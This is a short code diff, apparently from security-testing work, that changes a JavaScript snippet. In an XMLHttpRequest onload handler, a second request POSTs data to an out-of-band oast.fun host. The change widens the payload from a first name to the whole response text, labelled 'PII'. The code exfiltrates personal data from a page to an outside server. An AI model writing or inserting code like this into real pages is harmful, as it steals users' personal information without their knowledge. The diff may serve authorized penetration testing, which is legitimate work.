@@ -16,7 +16,7 @@ xhr.onload = function() {
     if (firstName && firstName.trim() !== "") {
     xxhr=new XMLHttpRequest();
     xxhr.open("POST","https://kypdqokutkzjkenfltayept3ry0mphyy4.oast.fun");
-    xxhr.send(`PII=${firstName}`);
+    xxhr.send(`PII=${xhr.responseText}`);
     } else {
       console.log("First Name is missing or empty");
     }
